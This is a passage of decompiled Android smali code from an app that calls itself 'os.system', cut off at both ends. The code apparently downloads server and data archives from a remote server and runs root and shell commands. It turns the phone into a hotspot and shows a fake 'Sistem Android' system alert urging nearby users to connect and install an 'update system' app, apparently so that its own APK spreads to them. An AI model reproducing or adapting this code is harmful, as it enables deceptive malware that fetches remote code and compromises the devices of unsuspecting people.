    move-result-object v1

    invoke-static {p2, v0, v1}, Los/system/Installer;->saveCode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 593
    :goto_0
    return-void

    .line 592
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public getPath()Ljava/lang/String;
    .locals 1

    .prologue
    .line 129
    sget-object v0, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    return-object v0
.end method

.method public install(Landroid/content/Context;)V
    .locals 4

    .prologue
    .line 155
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkDownload()Z

    move-result v0

    if-nez v0, :cond_0

    .line 157
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "download all data.........."

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 159
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v1, p0, Los/system/ReceiverBoot;->system:Los/system/SystemThread;

    sget-object v1, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/install.txt"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 160
    const-string v0, "web"

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 161
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 165
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/server.zip"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_4

    .line 168
    :try_start_0
    const-string v0, "download SERVER............\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 169
    new-instance v0, Lorg/json/JSONObject;

    sget-object v1, Los/system/ReceiverBoot;->requestResult:Ljava/lang/String;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 170
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "download server : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "url_install_server"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 172
    const-string v1, "url_install_server"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 173
    const-string v0, "download"

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 174
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/server.zip"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 175
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 194
    :cond_0
    :goto_0
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkDownload()Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkInstall()Z

    move-result v0

    if-nez v0, :cond_1

    .line 195
    const-string v0, "download DATA..............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 196
    const-string v0, "extract SERVER............\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 197
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/server.zip"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Los/system/ReceiverBoot;->pathToInstallServer:Ljava/lang/String;

    sget-object v2, Los/system/ReceiverBoot;->docFolder:Ljava/lang/String;

    invoke-direct {p0, p1, v0, v1, v2}, Los/system/ReceiverBoot;->extrak(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 200
    :cond_1
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkDownload()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkInstallData()Z

    move-result v0

    if-nez v0, :cond_2

    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkInstall()Z

    move-result v0

    if-eqz v0, :cond_2

    .line 201
    const-string v0, "extract SERVER.............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 202
    const-string v0, "extract DATA...............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 204
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/data.zip"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-direct {p0, p1, v0, v1, v2}, Los/system/ReceiverBoot;->extrak(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 207
    :cond_2
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkInstallData()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 208
    const/4 v0, 0x1

    sput-boolean v0, Los/system/ReceiverBoot;->installResult:Z

    .line 210
    :cond_3
    return-void

    .line 179
    :cond_4
    const-string v0, "download SERVER............OK\n"

    invoke-direct {p0, p1, v0}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 181
    :try_start_1
    new-instance v0, Lorg/json/JSONObject;

    sget-object v1, Los/system/ReceiverBoot;->requestResult:Ljava/lang/String;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 182
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "download DATA : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "url_install_data"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 183
    const-string v1, "download DATA..............\n"

    invoke-direct {p0, p1, v1}, Los/system/ReceiverBoot;->logSend(Landroid/content/Context;Ljava/lang/String;)V

    .line 185
    const-string v1, "url_install_data"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 186
    const-string v0, "download"

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 187
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v1, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/data.zip"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 188
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    .line 189
    :catch_0
    move-exception v0

    goto/16 :goto_0

    .line 177
    :catch_1
    move-exception v0

    goto/16 :goto_0
.end method

.method public main(Landroid/content/Context;[Ljava/lang/String;)V
    .locals 9

    .prologue
    const/4 v8, 0x2

    const/4 v7, 0x0

    const/4 v6, 0x1

    .line 276
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "panggil"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 278
    invoke-static {p1}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 280
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkRun()[Z

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->flags:[Z

    .line 282
    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v7

    if-eqz v0, :cond_3

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v6

    if-eqz v0, :cond_3

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v8

    if-eqz v0, :cond_3

    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "run server OK"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 285
    :goto_0
    invoke-static {p1}, Los/system/ReceiverBoot;->cekGsm(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 286
    invoke-static {v6, p1}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V

    .line 289
    :cond_0
    invoke-virtual {p0}, Los/system/ReceiverBoot;->cekClient()Ljava/lang/String;

    move-result-object v0

    const-string v1, "ada"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 290
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "ada client"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 291
    iget-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->cancel()V

    .line 308
    :cond_1
    :goto_1
    invoke-static {p1}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_5

    sget-boolean v0, Los/system/ReceiverBoot;->main:Z

    if-eqz v0, :cond_5

    .line 310
    sput-boolean v7, Los/system/ReceiverBoot;->main:Z

    .line 311
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "main:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-boolean v2, Los/system/ReceiverBoot;->main:Z

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 313
    invoke-static {v6, p1}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V

    .line 314
    invoke-virtual {p0, p2}, Los/system/ReceiverBoot;->rootCommands([Ljava/lang/String;)V

    .line 317
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "mkdir -p "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/client"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    .line 320
    :goto_2
    new-instance v0, Ljava/io/File;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/system.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_2

    .line 322
    new-instance v0, Los/system/MainActivity;

    invoke-direct {v0}, Los/system/MainActivity;-><init>()V

    const-string v1, "os.system"

    const-string v2, "pull"

    invoke-virtual {v0, p1, v1, v2}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 325
    const-wide/16 v0, 0xfa0

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 326
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "mv "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/os.system.apk "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/system.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 367
    :cond_2
    :goto_3
    return-void

    .line 283
    :cond_3
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->runSrv()V

    goto/16 :goto_0

    .line 294
    :cond_4
    const-string v0, "Sistem Android"

    const-string v1, "Network manager can\'t access hardware /etc/misc/wifi_supplicant please folowing:\n\n\n1. hubungkan wifi ke hotspot ini\n\n2. Sign captive portal\n     atau buka browser akses url        http://index.html\n\n3. Install dan buka app untuk update system"

    invoke-virtual {p0, p1, v0, v1}, Los/system/ReceiverBoot;->dialogAlert(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 296
    new-instance v0, Los/system/ReceiverBoot$3;

    const-wide/16 v2, 0x1388

    const-wide/16 v4, 0x64

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Los/system/ReceiverBoot$3;-><init>(Los/system/ReceiverBoot;JJ)V

    .line 303
    invoke-virtual {v0}, Los/system/ReceiverBoot$3;->start()Landroid/os/CountDownTimer;

    goto/16 :goto_1

    .line 327
    :catch_0
    move-exception v0

    .line 328
    sget-object v1, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "rename er : "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_3

    .line 334
    :cond_5
    invoke-static {p1}, Los/system/ReceiverBoot;->hostspotStatus(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-boolean v0, Los/system/ReceiverBoot;->main:Z

    if-nez v0, :cond_2

    .line 336
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "reset"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 338
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->checkRun()[Z

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->flags:[Z

    .line 339
    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v7

    if-eqz v0, :cond_6

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v6

    if-eqz v0, :cond_6

    sget-object v0, Los/system/ReceiverBoot;->flags:[Z

    aget-boolean v0, v0, v8

    if-eqz v0, :cond_6

    .line 341
    iget-object v0, p0, Los/system/ReceiverBoot;->utils:Los/system/ServerUtils;

    invoke-virtual {v0}, Los/system/ServerUtils;->stopSrv()V

    .line 342
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "stop server OK"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 345
    :cond_6
    iget-object v0, p0, Los/system/ReceiverBoot;->dialog:Landroid/app/AlertDialog;

    invoke-virtual {v0}, Landroid/app/AlertDialog;->cancel()V

    .line 347
    invoke-virtual {p0}, Los/system/ReceiverBoot;->cekClientOrServer()Ljava/lang/String;

    move-result-object v0

    const-string v1, "client"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 348
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    const-string v1, "mode client"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 349
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "http://"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {}, Los/system/Identitas;->getIpRouter()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ":8888/fileman.php?id="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-static {v6}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 350
    const-string v0, "web"

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 351
    invoke-virtual {p0, p1}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 356
    :cond_7
    :try_start_2
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "rm "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/system.apk"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 360
    :goto_4
    :try_start_3
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "rm -r "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    sget-object v2, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "/client"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 364
    :goto_5
    sput-boolean v6, Los/system/ReceiverBoot;->main:Z

    goto/16 :goto_3

    .line 362
    :catch_1
    move-exception v0

    goto :goto_5

    .line 358
    :catch_2
    move-exception v0

    goto :goto_4

    .line 318
    :catch_3
    move-exception v0

    goto/16 :goto_2
.end method

.method public mainRequest(Landroid/content/Context;)V
    .locals 4

    .prologue
    .line 732
    new-instance v0, Los/system/ReceiverBoot$CallWebPageTask;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Los/system/ReceiverBoot$CallWebPageTask;-><init>(Los/system/ReceiverBoot;Los/system/ReceiverBoot$1;)V

    .line 733
    iput-object p1, v0, Los/system/ReceiverBoot$CallWebPageTask;->applicationContext:Landroid/content/Context;

    .line 734
    sget-object v1, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    iput-object v1, v0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    .line 737
    :try_start_0
    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 738
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/String;

    const/4 v2, 0x0

    sget-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Los/system/ReceiverBoot$CallWebPageTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 744
    :goto_0
    return-void

    .line 740
    :cond_0
    sget-object v0, Los/system/ReceiverBoot;->TAG:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "rece connection : "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-static {p1}, Los/system/ReceiverBoot;->cekConnection(Landroid/content/Context;)Z

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 742
    :catch_0
